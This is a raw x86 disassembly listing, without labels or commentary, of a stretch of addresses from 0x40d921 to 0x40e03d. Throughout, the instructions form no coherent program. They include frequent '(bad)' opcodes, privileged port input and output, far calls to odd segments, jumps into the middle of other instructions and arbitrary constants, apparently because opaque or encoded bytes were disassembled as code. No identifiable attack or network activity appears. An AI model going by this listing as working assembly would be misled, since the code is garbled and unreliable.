  40d921:	enter  0x60a8,0x1c
  40d925:	jae    0x40d920
  40d927:	jo     0x40d9a1
  40d929:	mov    DWORD PTR [eax],0x54d132bc
  40d92f:	xchg   esp,eax
  40d930:	jb     0x40d952
  40d932:	(bad)  
  40d933:	push   0x5e3d150d
  40d938:	mov    edi,0x2644051b
  40d93d:	repnz aaa 
  40d93f:	mov    edx,esp
  40d941:	loop   0x40d923
  40d943:	into   
  40d944:	sti    
  40d945:	rol    BYTE PTR [ebx],cl
  40d947:	cmp    ebp,DWORD PTR [edx]
  40d949:	pop    edx
  40d94a:	xor    al,0x7b
  40d94c:	fwait
  40d94d:	inc    ebp
  40d94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d94f:	fimul  WORD PTR [ecx]
  40d951:	adc    BYTE PTR [esi],0x8f
  40d954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d955:	xor    eax,0x951a2487
  40d95a:	or     bl,BYTE PTR [ebx+edi*8]
  40d95d:	or     BYTE PTR [esi],bh
  40d95f:	ffreep st(5)
  40d961:	ja     0x40d944
  40d963:	dec    edx
  40d964:	iret   
  40d965:	std    
  40d966:	dec    ebp
  40d967:	mov    ah,0xfb
  40d969:	cmp    cl,BYTE PTR [ebp+0x17]
  40d96c:	push   ss
  40d96d:	(bad)  
  40d96e:	popf   
  40d96f:	mov    al,0x4
  40d971:	sub    edi,DWORD PTR [eax]
  40d973:	fcomp  DWORD PTR [ebx+0x688731f1]
  40d979:	ins    DWORD PTR es:[edi],dx
  40d97a:	jo     0x40d94f
  40d97c:	dec    edi
  40d97d:	pop    edi
  40d97e:	test   eax,0x46b78550
  40d983:	dec    ebp
  40d984:	data16 ss mov bl,0xf3
  40d988:	ins    DWORD PTR es:[edi],dx
  40d989:	jne    0x40d98e
  40d98b:	push   esi
  40d98c:	lahf   
  40d98d:	out    dx,eax
  40d98e:	add    eax,0x7d908be4
  40d993:	sub    bl,ch
  40d995:	mov    ecx,0x704632cc
  40d99a:	jo     0x40d93a
  40d99c:	xchg   esp,eax
  40d99d:	fwait
  40d99e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d99f:	push   edi
  40d9a0:	mov    es,esi
  40d9a2:	dec    edi
  40d9a3:	hlt    
  40d9a4:	scas   eax,DWORD PTR es:[edi]
  40d9a5:	fcmovbe st,st(7)
  40d9a7:	and    bh,al
  40d9a9:	sbb    al,cl
  40d9ab:	(bad)  
  40d9ad:	test   DWORD PTR [esp+ebp*2],0xa1cf1e8c
  40d9b4:	rol    DWORD PTR [edx+ebx*4-0x27],1
  40d9b8:	xor    cl,ah
  40d9ba:	sub    eax,0x229c454e
  40d9bf:	icebp  
  40d9c0:	repz dec ebp
  40d9c2:	dec    edx
  40d9c3:	fwait
  40d9c4:	popf   
  40d9c5:	or     BYTE PTR [eax+eiz*8+0x9],bl
  40d9c9:	mov    esi,DWORD PTR [ebp+0x52]
  40d9cc:	jmp    0x40d9ef
  40d9ce:	pop    ebx
  40d9cf:	jb     0x40d970
  40d9d1:	pop    edi
  40d9d2:	fucomp st(1)
  40d9d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9d5:	fcom   DWORD PTR [ecx+edx*4]
  40d9d8:	push   ss
  40d9d9:	sub    DWORD PTR [ebp+0x1],0x64624ad0
  40d9e0:	ret    
  40d9e1:	inc    ebx
  40d9e3:	lea    esi,[edi]
  40d9e5:	jne    0x40d99e
  40d9e7:	pop    ebp
  40d9e8:	add    BYTE PTR [edx+0x1fbdf8d0],dl
  40d9ee:	xchg   edi,eax
  40d9ef:	dec    edi
  40d9f0:	jb     0x40da68
  40d9f2:	clc    
  40d9f3:	retf   0xc94e
  40d9f6:	jo     0x40d9df
  40d9f8:	in     eax,0x47
  40d9fa:	mov    bl,0xfa
  40d9fc:	sar    BYTE PTR [esp+edi*1+0x6059a601],cl
  40da03:	std    
  40da04:	pusha  
  40da05:	dec    edi
  40da06:	inc    ebp
  40da07:	test   al,0xeb
  40da09:	test   al,0x63
  40da0b:	add    DWORD PTR [ebp+0x75],0x59d46e6
  40da12:	sub    BYTE PTR [esi],dl
  40da14:	push   cs
  40da15:	ret    
  40da16:	inc    edx
  40da17:	or     al,0xc4
  40da19:	adc    DWORD PTR [ebx+0x24],eax
  40da1c:	bound  edi,QWORD PTR [eax-0x7e51b21f]
  40da22:	(bad)  
  40da23:	mov    esi,0xb970974d
  40da28:	pop    ecx
  40da29:	xor    BYTE PTR [ebp-0x26],bh
  40da2c:	xchg   edx,eax
  40da2d:	ins    DWORD PTR es:[edi],dx
  40da2e:	and    edi,esi
  40da30:	frstor [eax-0x26]
  40da33:	xchg   edx,eax
  40da34:	je     0x40da71
  40da36:	into   
  40da37:	sub    al,0x91
  40da39:	out    0xef,eax
  40da3b:	out    dx,al
  40da3c:	cld    
  40da3d:	xchg   ebp,eax
  40da3e:	jnp    0x40da2a
  40da40:	stos   DWORD PTR es:[edi],eax
  40da41:	fdiv   DWORD PTR [ecx+0x28e88ecf]
  40da47:	or     BYTE PTR [ebx],0xb8
  40da4a:	add    BYTE PTR [esi],ch
  40da4c:	and    eax,0x29deede9
  40da51:	sbb    BYTE PTR [edi],dl
  40da53:	popa   
  40da54:	push   cs
  40da55:	repnz sar DWORD PTR [esi+0x744f7a4e],1
  40da5c:	ret    0x2a8b
  40da5f:	jg     0x40da76
  40da61:	sub    al,0x28
  40da63:	(bad)  
  40da64:	test   WORD PTR [ecx],dx
  40da67:	repz cld 
  40da69:	shl    BYTE PTR [esi],0xc9
  40da6c:	(bad)  
  40da6d:	retf   0xd1a2
  40da70:	aas    
  40da71:	cmovno esi,DWORD PTR [ecx-0x5f]
  40da75:	int3   
  40da76:	pop    ss
  40da77:	add    cl,BYTE PTR [esi+0x1a03bdeb]
  40da7d:	les    ecx,FWORD PTR [eax]
  40da7f:	(bad)  
  40da80:	xor    esp,eax
  40da82:	pusha  
  40da83:	fsubr  DWORD PTR [ebx-0xf]
  40da86:	inc    esp
  40da87:	inc    esp
  40da88:	test   DWORD PTR [ebx-0x28d3ca18],ebx
  40da8e:	mov    esi,DWORD PTR ds:0xeaecd417
  40da94:	fdiv   QWORD PTR [eax+ebp*1-0x1e27832e]
  40da9b:	stos   BYTE PTR es:[edi],al
  40da9c:	shl    BYTE PTR [esi-0x48f5339d],0x65
  40daa3:	test   al,0x6a
  40daa5:	stos   BYTE PTR es:[edi],al
  40daa6:	and    dl,BYTE PTR [edx+edi*1+0x17]
  40daaa:	repnz sbb edx,DWORD PTR [ecx-0x59]
  40daae:	dec    edi
  40daaf:	ins    DWORD PTR es:[edi],dx
  40dab0:	test   eax,0xe0b721a3
  40dab5:	cmp    BYTE PTR [eax-0x42],bl
  40dab8:	push   cs
  40dab9:	aaa    
  40daba:	scas   al,BYTE PTR es:[edi]
  40dabb:	addr16 pop ds
  40dabd:	jbe    0x40dad6
  40dabf:	iret   
  40dac0:	aaa    
  40dac1:	cli    
  40dac2:	and    DWORD PTR ds:0xfa9dd742,0x9a7b16db
  40dacc:	mov    ebx,0xadaef54a
  40dad1:	sub    BYTE PTR [ebp-0x7c0d06b],0x2
  40dad8:	and    bl,BYTE PTR gs:[edx]
  40dadb:	push   0x5c
  40dadd:	dec    edi
  40dade:	cmp    DWORD PTR [edi],esp
  40dae0:	sbb    eax,0x2f57fbf0
  40dae5:	adc    DWORD PTR [ebx-0x36],esp
  40dae8:	xchg   DWORD PTR [esi],ebp
  40daea:	int    0x63
  40daec:	outs   dx,DWORD PTR ds:[esi]
  40daed:	push   ebx
  40daee:	loope  0x40db64
  40daf0:	je     0x40dafa
  40daf2:	cmp    BYTE PTR [edx],dl
  40daf4:	rcr    DWORD PTR [ebp-0x1a],cl
  40daf7:	cs or  al,0xb6
  40dafa:	lock not cl
  40dafd:	pop    ebx
  40dafe:	pop    ss
  40daff:	daa    
  40db00:	push   ebx
  40db01:	popa   
  40db02:	inc    edi
  40db03:	arpl   WORD PTR [ecx],sp
  40db05:	push   es
  40db06:	jge    0x40db25
  40db08:	imul   ebp,DWORD PTR [edx-0x22],0x1efca50d
  40db0f:	inc    edi
  40db10:	cmp    BYTE PTR [edi-0x3d],ah
  40db13:	add    DWORD PTR [ecx-0x4f37a794],esi
  40db19:	and    DWORD PTR [ebx],esi
  40db1b:	pop    esp
  40db1c:	cmp    BYTE PTR [eax+ecx*4],0xe5
  40db20:	adc    ebx,edi
  40db22:	cmp    DWORD PTR [esi],eax
  40db24:	push   esp
  40db25:	mov    al,0xfd
  40db27:	mov    eax,0x7743ee8e
  40db2c:	iret   
  40db2d:	cmp    al,0x52
  40db2f:	or     BYTE PTR [edx-0x39cfda56],dh
  40db35:	push   ss
  40db36:	loop   0x40db34
  40db38:	adc    DWORD PTR [ebx],edi
  40db3a:	or     bl,dl
  40db3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db3d:	scas   eax,DWORD PTR es:[edi]
  40db3e:	cwde   
  40db3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db40:	xchg   ah,bh
  40db42:	and    edx,DWORD PTR [ecx]
  40db44:	xor    ah,ah
  40db46:	sti    
  40db47:	xor    BYTE PTR [edx+0x41],bh
  40db4a:	(bad)  
  40db4b:	pop    ebx
  40db4c:	addr16 nop
  40db4e:	pushf  
  40db4f:	out    dx,eax
  40db50:	xchg   ecx,eax
  40db51:	lahf   
  40db52:	retf   
  40db53:	(bad)  
  40db55:	inc    ebx
  40db56:	adc    DWORD PTR ss:[ebx+0x41],ebp
  40db5a:	adc    edx,DWORD PTR [ebp+0x79]
  40db5d:	aam    0x97
  40db5f:	scas   eax,DWORD PTR es:[edi]
  40db60:	mov    cl,0xff
  40db62:	js     0x40db44
  40db64:	xchg   ecx,eax
  40db65:	stos   BYTE PTR es:[edi],al
  40db66:	es sbb ecx,edx
  40db69:	add    DWORD PTR fs:[ebp+0x27],0xa3d9cf29
  40db71:	sbb    dh,BYTE PTR [edx]
  40db73:	repnz pushf 
  40db75:	jecxz  0x40db7e
  40db77:	push   cs
  40db78:	pop    esi
  40db79:	adc    cl,BYTE PTR [esi+0x3b8e88d8]
  40db7f:	and    bh,BYTE PTR [edx+0x28]
  40db82:	repnz das 
  40db84:	add    BYTE PTR [esi],dl
  40db86:	cwde   
  40db87:	jmp    DWORD PTR [edx+0x58]
  40db8a:	loope  0x40db7d
  40db8c:	cld    
  40db8d:	retf   
  40db8e:	daa    
  40db8f:	xchg   edi,eax
  40db90:	jne    0x40dbbb
  40db92:	jo     0x40db5d
  40db94:	mov    esi,0x45f806fa
  40db99:	inc    ebx
  40db9a:	fild   DWORD PTR [ecx]
  40db9c:	inc    ebp
  40db9d:	push   0xffffffbf
  40db9f:	jnp    0x40dbd3
  40dba1:	pop    ecx
  40dba2:	or     BYTE PTR [esi+0x4c408c9d],dl
  40dba8:	xchg   BYTE PTR ds:0x5618940,al
  40dbae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbaf:	loopne 0x40db53
  40dbb1:	add    eax,0x51a105db
  40dbb6:	out    dx,eax
  40dbb7:	push   ebx
  40dbb8:	rcl    BYTE PTR [esi],cl
  40dbba:	clc    
  40dbbb:	mov    ah,0x1
  40dbbd:	pop    ebp
  40dbbe:	sahf   
  40dbbf:	push   edx
  40dbc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbc1:	mov    ebp,0x6b8f16b0
  40dbc7:	mov    bh,0xff
  40dbc9:	rcr    DWORD PTR [ebx],cl
  40dbcb:	push   ebx
  40dbcc:	cmp    eax,0xae957a50
  40dbd1:	pop    ebp
  40dbd2:	inc    eax
  40dbd3:	or     ah,BYTE PTR [ebp-0x38]
  40dbd6:	cwde   
  40dbd7:	icebp  
  40dbd8:	(bad)  
  40dbd9:	pop    ebp
  40dbda:	xor    ecx,DWORD PTR [edx*2+0x1213a20c]
  40dbe1:	je     0x40dc18
  40dbe3:	lods   eax,DWORD PTR ds:[esi]
  40dbe4:	push   esp
  40dbe5:	je     0x40dba9
  40dbe7:	add    BYTE PTR [eax-0x2c1beb1c],0xee
  40dbee:	in     al,dx
  40dbef:	leave  
  40dbf0:	push   0xffffff90
  40dbf2:	stos   BYTE PTR es:[edi],al
  40dbf3:	rol    DWORD PTR [ebp+eax*4+0x78a81e9f],1
  40dbfa:	xor    dl,BYTE PTR ds:0x70d43a95
  40dc00:	std    
  40dc01:	mov    dh,0xd4
  40dc03:	cwde   
  40dc04:	aaa    
  40dc05:	aas    
  40dc06:	xchg   DWORD PTR [esi],esi
  40dc08:	inc    edi
  40dc09:	push   ebp
  40dc0a:	cmc    
  40dc0b:	fisub  WORD PTR [edx]
  40dc0d:	and    esi,ebp
  40dc0f:	xor    eax,0x17f9a8fb
  40dc14:	sbb    al,0x52
  40dc16:	push   esi
  40dc17:	out    0x3c,eax
  40dc19:	or     bh,BYTE PTR [ebx-0x32]
  40dc1c:	test   eax,0xddaacf79
  40dc21:	outs   dx,BYTE PTR ds:[esi]
  40dc22:	sbb    al,0x38
  40dc24:	pop    ecx
  40dc25:	into   
  40dc26:	adc    dh,BYTE PTR [ecx]
  40dc28:	retf   
  40dc29:	cli    
  40dc2a:	dec    esi
  40dc2b:	add    DWORD PTR [ecx+0x3927b4ce],edx
  40dc31:	fs js  0x40dc8b
  40dc34:	and    eax,0x86afb283
  40dc39:	mov    dh,0x82
  40dc3b:	cwde   
  40dc3c:	iret   
  40dc3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc3e:	cmp    DWORD PTR [ebx+0x73],edx
  40dc41:	lock std 
  40dc43:	mov    ebp,0x2ee8750
  40dc48:	ja     0x40dbd9
  40dc4a:	or     eax,0x1e254d7
  40dc4f:	scas   al,BYTE PTR es:[edi]
  40dc50:	stc    
  40dc51:	loope  0x40dcb0
  40dc53:	jecxz  0x40dbf5
  40dc55:	out    0x2,eax
  40dc57:	pop    ss
  40dc58:	mov    bh,0xf
  40dc5a:	dec    ebx
  40dc5b:	rcl    DWORD PTR [edi+0x2a],0xe8
  40dc5f:	mov    ?,WORD PTR [edx]
  40dc61:	mov    esp,0x3810d0d4
  40dc66:	push   ebp
  40dc67:	outs   dx,DWORD PTR ds:[esi]
  40dc68:	out    0xdf,eax
  40dc6a:	mov    al,ds:0xf009f214
  40dc6f:	xor    al,BYTE PTR [esi]
  40dc71:	jo     0x40dc6f
  40dc73:	push   es
  40dc74:	sub    BYTE PTR [edx],cl
  40dc76:	add    edi,DWORD PTR [ecx+0x51b18766]
  40dc7c:	cwde   
  40dc7d:	mov    bh,0xb8
  40dc7f:	outs   dx,DWORD PTR ds:[esi]
  40dc80:	jl     0x40dc2f
  40dc82:	sub    eax,esi
  40dc84:	jl     0x40dcbd
  40dc86:	sbb    ah,al
  40dc88:	mov    esp,0xe45c4a0a
  40dc8d:	push   edx
  40dc8e:	es cwde 
  40dc90:	fimul  DWORD PTR [ebx-0x30]
  40dc93:	push   0x1d
  40dc95:	mov    ds:0x1afbeae4,al
  40dc9a:	inc    esi
  40dc9b:	dec    edi
  40dc9c:	cdq    
  40dc9d:	add    DWORD PTR [edx+eiz*4+0x6],esi
  40dca1:	inc    ebx
  40dca2:	dec    edx
  40dca3:	stos   DWORD PTR es:[edi],eax
  40dca4:	idiv   DWORD PTR [ecx+0x1a]
  40dca7:	cmp    al,0x0
  40dca9:	inc    ecx
  40dcaa:	push   0x44
  40dcac:	mov    ch,0x54
  40dcae:	mov    WORD PTR [eax],gs
  40dcb0:	cli    
  40dcb1:	sub    esp,DWORD PTR [esi-0x16]
  40dcb4:	pop    eax
  40dcb5:	in     eax,dx
  40dcb6:	sar    BYTE PTR [ebx],0xd2
  40dcb9:	lahf   
  40dcba:	aaa    
  40dcbb:	scas   eax,DWORD PTR es:[edi]
  40dcbc:	out    0xc6,al
  40dcbe:	loop   0x40dca7
  40dcc0:	in     eax,dx
  40dcc1:	stc    
  40dcc2:	shl    BYTE PTR [edx+esi*2],cl
  40dcc5:	dec    bp
  40dcc7:	ss (bad) 
  40dcc9:	clc    
  40dcca:	xor    esp,DWORD PTR [ebx]
  40dccc:	sahf   
  40dccd:	lock loop 0x40dcb2
  40dcd0:	and    edi,ebp
  40dcd2:	fld    TBYTE PTR ds:0x80d62251
  40dcd8:	repnz pop ebx
  40dcda:	pop    es
  40dcdb:	sub    bl,dl
  40dcdd:	imul   edi,DWORD PTR [edi+0x4f],0xb3b213d3
  40dce4:	dec    edi
  40dce5:	int3   
  40dce6:	and    ebp,edx
  40dce8:	scas   eax,DWORD PTR es:[edi]
  40dce9:	push   esi
  40dcea:	add    al,0x3a
  40dcec:	add    eax,0x84aea83e
  40dcf1:	mov    BYTE PTR [esi],cl
  40dcf3:	mov    al,ds:0x5d6bcbb6
  40dcf8:	sub    BYTE PTR [eax],dh
  40dcfa:	cs aam 0x33
  40dcfd:	mov    esi,0xd521295f
  40dd02:	call   0xf9e0:0x53c93f45
  40dd09:	pop    esi
  40dd0a:	bound  esi,QWORD PTR [ecx+ecx*8+0x0]
  40dd0e:	mov    dh,0x40
  40dd10:	xor    DWORD PTR [eax-0x57],edi
  40dd13:	inc    esi
  40dd14:	and    ch,BYTE PTR [ebx]
  40dd16:	cmp    DWORD PTR [edx+0x7d5baaa1],ebx
  40dd1c:	stc    
  40dd1d:	pushf  
  40dd1e:	rcl    dh,1
  40dd20:	das    
  40dd21:	adc    BYTE PTR [ebx+0x4138c030],0x26
  40dd28:	add    eax,0x9bd53edc
  40dd2d:	in     eax,0x46
  40dd2f:	lds    ecx,FWORD PTR [edi]
  40dd31:	adc    dh,BYTE PTR [ebx-0x3f]
  40dd34:	mov    dl,0xc4
  40dd36:	mov    edx,0xaefaad39
  40dd3b:	inc    edx
  40dd3c:	jecxz  0x40dd24
  40dd3e:	int    0x16
  40dd40:	add    eax,0xb35cbe55
  40dd45:	pop    edi
  40dd46:	lds    eax,FWORD PTR ds:0x19fe1137
  40dd4c:	ret    
  40dd4d:	push   esp
  40dd4e:	inc    ebp
  40dd4f:	push   ebp
  40dd50:	inc    ebx
  40dd51:	int3   
  40dd52:	fdivr  DWORD PTR [eax+0xa441978]
  40dd58:	xor    eax,0x57318648
  40dd5d:	out    dx,eax
  40dd5e:	jbe    0x40dcf1
  40dd60:	hlt    
  40dd61:	loopne 0x40ddb2
  40dd63:	inc    DWORD PTR [ecx-0x63bb8ed2]
  40dd69:	pop    edx
  40dd6a:	ror    BYTE PTR [ebx+0x7dc79fe4],cl
  40dd70:	fidivr DWORD PTR [ecx]
  40dd72:	xchg   ecx,eax
  40dd73:	leave  
  40dd74:	mov    al,0xca
  40dd76:	xchg   ecx,eax
  40dd77:	cmp    BYTE PTR [eax],al
  40dd79:	ins    BYTE PTR es:[edi],dx
  40dd7a:	(bad)  
  40dd7b:	out    dx,al
  40dd7c:	or     BYTE PTR [eax+0x79d39025],bh
  40dd82:	inc    edx
  40dd83:	or     BYTE PTR [edx],0xde
  40dd86:	mov    WORD PTR [ecx-0x5e],cs
  40dd89:	push   ds
  40dd8a:	loopne 0x40dd18
  40dd8c:	mov    esi,0x55b670d3
  40dd91:	inc    edi
  40dd92:	or     DWORD PTR [edi-0x1],ebp
  40dd95:	scas   eax,DWORD PTR es:[edi]
  40dd96:	jp     0x40ddb8
  40dd98:	mov    dl,ah
  40dd9a:	std    
  40dd9b:	stos   DWORD PTR es:[edi],eax
  40dd9c:	cmp    al,BYTE PTR [esi-0x6c13a7cf]
  40dda2:	and    cl,ch
  40dda4:	int3   
  40dda5:	rcl    esi,0xce
  40dda8:	rcl    BYTE PTR [esi],0xd4
  40ddab:	mov    ds:0x48065b8c,eax
  40ddb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddb1:	cmp    DWORD PTR [edx-0x5f],esi
  40ddb4:	aad    0x56
  40ddb6:	mov    dh,0x59
  40ddb8:	or     BYTE PTR [esp+eax*1-0x78],bh
  40ddbc:	xchg   edi,eax
  40ddbd:	aam    0x8b
  40ddbf:	repnz xor eax,0xcf0d83cb
  40ddc5:	dec    esp
  40ddc6:	add    DWORD PTR [ebx+0x5f],esi
  40ddc9:	dec    ebp
  40ddca:	adc    al,0x65
  40ddcc:	into   
  40ddcd:	sbb    eax,DWORD PTR [edx-0x56]
  40ddd0:	sbb    al,0xb1
  40ddd2:	and    DWORD PTR [edx+0x53],esi
  40ddd5:	sbb    edx,ebp
  40ddd7:	and    dl,ch
  40ddd9:	aas    
  40ddda:	inc    esi
  40dddb:	dec    ebx
  40dddc:	or     BYTE PTR [eax-0x5f60de41],ah
  40dde2:	xchg   esi,eax
  40dde3:	in     eax,0x76
  40dde5:	push   eax
  40dde6:	or     BYTE PTR [eax+ecx*2+0x78],cl
  40ddea:	adc    BYTE PTR [ecx+0x75f0bb56],0x97
  40ddf1:	mov    ecx,DWORD PTR [edi]
  40ddf3:	scas   eax,DWORD PTR es:[edi]
  40ddf4:	add    BYTE PTR [ebx-0x317717a0],0xd6
  40ddfb:	mov    al,ds:0x57cd3066
  40de00:	or     DWORD PTR [ecx],esp
  40de02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de03:	mov    esp,0xe04edc44
  40de08:	push   esp
  40de09:	mov    ch,0x77
  40de0b:	in     al,0x59
  40de0d:	test   DWORD PTR [eax-0x7fe74d52],0xd55015ee
  40de17:	jle    0x40de8e
  40de19:	jmp    0x40de10
  40de1b:	add    al,0x45
  40de1d:	push   ecx
  40de1e:	and    al,0x96
  40de20:	jae    0x40de8c
  40de22:	imul   DWORD PTR [esi]
  40de24:	lds    ebx,FWORD PTR [edi+0x11]
  40de27:	dec    ebx
  40de28:	leave  
  40de29:	xchg   edi,eax
  40de2a:	mov    ah,0xf6
  40de2c:	pop    eax
  40de2d:	adc    al,0xcf
  40de2f:	push   edx
  40de30:	push   es
  40de31:	dec    edi
  40de32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de33:	inc    esi
  40de34:	fadd   st(7),st
  40de36:	adc    al,0xb3
  40de38:	jmp    0xf000:0xd2ea07f5
  40de3f:	sub    eax,0xdce20303
  40de44:	xor    DWORD PTR [ebp-0x37],ebp
  40de47:	xlat   BYTE PTR ds:[ebx]
  40de48:	push   ebp
  40de49:	push   ss
  40de4a:	mov    ds:0xfd32fd01,al
  40de4f:	add    eax,0x3ff11d5e
  40de54:	mov    esp,0x315bdc8a
  40de59:	into   
  40de5a:	mov    eax,0xaa453180
  40de5f:	jae    0x40de14
  40de61:	ss jno 0x40de91
  40de64:	xor    edi,ebx
  40de66:	mov    DWORD PTR [ebp+0x5916da35],ebp
  40de6c:	jp     0x40dedf
  40de6e:	stc    
  40de6f:	(bad)  
  40de70:	jo     0x40de41
  40de72:	jg     0x40de5f
  40de74:	pop    esi
  40de75:	mov    ds:0xf4df413c,eax
  40de7a:	mov    ebx,0x6dcf3013
  40de7f:	push   cs
  40de80:	push   ebp
  40de81:	sbb    dl,bl
  40de83:	pop    ss
  40de84:	dec    ecx
  40de85:	out    0xaf,eax
  40de87:	xchg   ebp,eax
  40de88:	ins    WORD PTR es:[edi],dx
  40de8a:	dec    ecx
  40de8b:	adc    esp,DWORD PTR [ebx]
  40de8d:	retf   0xb8ef
  40de90:	rcl    DWORD PTR [edi+0x71e659a0],1
  40de96:	add    edi,DWORD PTR [esi+edi*8]
  40de99:	sub    al,0x6d
  40de9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de9c:	ss mov al,0x7b
  40de9f:	inc    edi
  40dea0:	(bad)  
  40dea2:	push   ecx
  40dea3:	std    
  40dea4:	repnz pop ebp
  40dea6:	cmp    dh,dl
  40dea8:	mov    edi,0x502d9ba9
  40dead:	div    BYTE PTR [edi+0x5]
  40deb0:	loope  0x40dea4
  40deb2:	pop    eax
  40deb3:	loope  0x40de3f
  40deb5:	dec    ebp
  40deb6:	test   DWORD PTR [ebx-0x64780333],ecx
  40debc:	cmp    edx,DWORD PTR [ebp-0x4a444f41]
  40dec2:	gs jb  0x40deeb
  40dec5:	xor    al,BYTE PTR [ecx-0x959475c]
  40decb:	loop   0x40deee
  40decd:	call   0x202c:0x90da1b60
  40ded4:	add    DWORD PTR [ebx],0xf8370e3c
  40deda:	lods   eax,DWORD PTR ds:[esi]
  40dedb:	das    
  40dedc:	add    BYTE PTR [edi-0x56fe3e13],cl
  40dee2:	shl    BYTE PTR ds:0xd72db0cf,0xd3
  40dee9:	xor    al,0xa9
  40deeb:	scas   al,BYTE PTR es:[edi]
  40deec:	into   
  40deed:	jnp    0x40df68
  40deef:	pop    ebp
  40def0:	and    BYTE PTR [edi],ah
  40def2:	xor    edx,DWORD PTR [ecx-0x9dc580]
  40def8:	dec    ebx
  40def9:	fdiv   DWORD PTR [edx+0x51]
  40defc:	in     al,0xde
  40defe:	jb     0x40dea2
  40df00:	dec    ecx
  40df01:	in     eax,0xaf
  40df03:	pop    es
  40df04:	pop    edi
  40df05:	dec    ebp
  40df06:	loopne 0x40deb7
  40df08:	stos   DWORD PTR es:[edi],eax
  40df09:	test   BYTE PTR [eax+0x52],bh
  40df0c:	inc    esi
  40df0d:	(bad)  
  40df0e:	call   0xb378:0x86bf8018
  40df15:	stos   DWORD PTR es:[edi],eax
  40df16:	sbb    al,0x14
  40df18:	lods   eax,DWORD PTR ds:[esi]
  40df19:	mov    dl,0x5d
  40df1b:	stos   DWORD PTR es:[edi],eax
  40df1c:	inc    ecx
  40df1d:	mov    bl,bh
  40df1f:	test   eax,0xe3fcbbc0
  40df24:	mov    ecx,0x30d30d7f
  40df29:	mov    esi,0x2c45ffe8
  40df2e:	sub    edx,edi
  40df30:	fnsave [edi-0x38]
  40df33:	test   eax,0x66ff148f
  40df38:	sbb    DWORD PTR [esi+0x6],edx
  40df3b:	pop    esi
  40df3c:	dec    esp
  40df3d:	test   DWORD PTR [ecx+0x7f],esi
  40df40:	fist   WORD PTR [eax]
  40df42:	jno    0x40dedb
  40df44:	leave  
  40df45:	cs in  al,dx
  40df47:	jne    0x40df50
  40df49:	xchg   esi,eax
  40df4a:	add    al,ah
  40df4c:	je     0x40df06
  40df4e:	mov    bh,BYTE PTR [edx+ecx*2+0x1d]
  40df52:	dec    ecx
  40df53:	jnp    0x40dfa3
  40df55:	mov    ds:0xb3c3e107,al
  40df5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df5b:	stos   BYTE PTR es:[edi],al
  40df5c:	xchg   esp,eax
  40df5d:	mov    esp,0x4b0eb680
  40df62:	inc    ecx
  40df63:	(bad)  
  40df64:	jno    0x40dfe3
  40df66:	ins    DWORD PTR es:[edi],dx
  40df67:	adc    DWORD PTR [ebx-0x4c],0x1f7bac19
  40df6e:	leave  
  40df6f:	pop    es
  40df70:	addr16 iret 
  40df72:	jo     0x40dfbe
  40df74:	jno    0x40df8e
  40df76:	inc    cx
  40df78:	shr    ecx,cl
  40df7a:	and    DWORD PTR [edi+0x2e],edi
  40df7d:	mov    ah,0x61
  40df7f:	mov    WORD PTR [edx+edi*8+0x49],gs
  40df83:	mov    eax,0x54b76b8c
  40df88:	or     eax,0x98f44dca
  40df8d:	cmp    edx,DWORD PTR [ebx+ecx*2+0x67]
  40df91:	aaa    
  40df92:	mul    BYTE PTR [esi+0x5626348f]
  40df98:	jg     0x40df30
  40df9a:	fiadd  WORD PTR [esi+0x38f3e407]
  40dfa0:	gs mov ebx,0x6b5427e1
  40dfa6:	repnz xor BYTE PTR [esi],0x4c
  40dfaa:	sub    dh,BYTE PTR [esi]
  40dfac:	or     ecx,0x2e
  40dfaf:	in     eax,0xfa
  40dfb1:	in     eax,0x4c
  40dfb3:	lds    edx,FWORD PTR [ebp+0x78]
  40dfb6:	add    BYTE PTR [edi+0xa],ah
  40dfb9:	ret    
  40dfba:	(bad)  
  40dfbb:	jnp    0x40df47
  40dfbd:	data16 fimul DWORD PTR [ecx-0x5c]
  40dfc1:	data16 mov bl,0xac
  40dfc4:	jge    0x40e03f
  40dfc6:	(bad)  
  40dfc8:	das    
  40dfc9:	jmp    FWORD PTR [ecx+eiz*2]
  40dfcc:	mov    ecx,0xf439083b
  40dfd1:	mov    bh,0xb2
  40dfd3:	(bad)  [esi]
  40dfd5:	xchg   edi,eax
  40dfd6:	add    eax,0x45146606
  40dfdb:	push   ebp
  40dfdc:	add    ecx,DWORD PTR ds:0x2a2fc64b
  40dfe2:	fadd   st(0),st
  40dfe4:	mov    ebp,0xa91e5a91
  40dfe9:	sahf   
  40dfea:	pop    edi
  40dfeb:	loopne 0x40df87
  40dfed:	add    eax,0xd7a2fee
  40dff2:	add    BYTE PTR [ecx+0x72],al
  40dff5:	and    eax,0xcce914b1
  40dffa:	xor    al,ch
  40dffc:	mov    DWORD PTR [ebx-0x27890e40],esp
  40e002:	xchg   ebx,eax
  40e003:	enter  0xfcfc,0x3c
  40e007:	mov    ah,0x5f
  40e009:	xor    eax,0x4c1998b0
  40e00e:	xchg   esi,eax
  40e00f:	ins    DWORD PTR es:[edi],dx
  40e010:	mov    DWORD PTR [eax+0x19],ebp
  40e013:	aad    0x30
  40e015:	and    edi,esp
  40e017:	hlt    
  40e018:	xchg   ecx,eax
  40e019:	xchg   edx,eax
  40e01a:	into   
  40e01b:	fsub   QWORD PTR [esi]
  40e01d:	js     0x40e02a
  40e01f:	mov    ds:0x126c317c,eax
  40e024:	repz jg 0x40dfd5
  40e027:	fs mov al,0x9
  40e02a:	lea    ecx,[ecx]
  40e02c:	pop    ebx
  40e02d:	repnz add edi,DWORD PTR ds:0x777a31ca
  40e034:	mov    edx,esp
  40e036:	test   BYTE PTR [ecx+0x79b42621],0x5f
  40e03d:	clc    
